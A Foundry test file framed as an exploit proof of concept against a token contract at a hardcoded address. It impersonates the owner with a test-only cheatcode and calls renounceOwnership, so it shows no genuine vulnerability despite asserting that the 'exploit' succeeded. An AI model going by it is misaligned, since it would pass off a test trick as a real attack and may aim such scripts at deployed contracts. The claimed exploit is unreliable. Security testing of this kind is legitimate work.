// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface SapToken {
    function owner() external view returns (address);
    function renounceOwnership() external;
    function transferOwnership(address newOwner_) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll read the owner dynamically
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        address currentOwner = SapToken(TARGET).owner();
        console.log("Current owner:", currentOwner);

        // Step 2: Impersonate the owner and renounce ownership
        vm.prank(currentOwner);
        SapToken(TARGET).renounceOwnership();

        // Step 3: Verify the owner is now address(0)
        address newOwner = SapToken(TARGET).owner();
        console.log("New owner after renounce:", newOwner);
        assertEq(newOwner, address(0), "Owner should be address(0) after renounceOwnership");
        assertEq(newOwner, address(0), "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
